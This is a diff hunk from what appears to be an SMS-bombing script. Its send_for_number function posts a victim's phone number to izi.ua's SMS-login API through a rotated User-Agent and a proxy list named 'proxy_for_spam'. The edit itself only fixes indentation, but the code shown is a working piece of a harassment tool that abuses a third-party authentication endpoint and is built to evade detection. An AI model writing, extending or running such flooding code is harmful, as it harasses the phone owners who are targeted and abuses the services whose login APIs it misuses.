@@ -226,7 +226,7 @@ def send_for_number(phone):
 		print('-')
 
 	try:
-	  requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone}, headers={
+		requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone}, headers={
 	                "User-Agent": ua.random}, proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
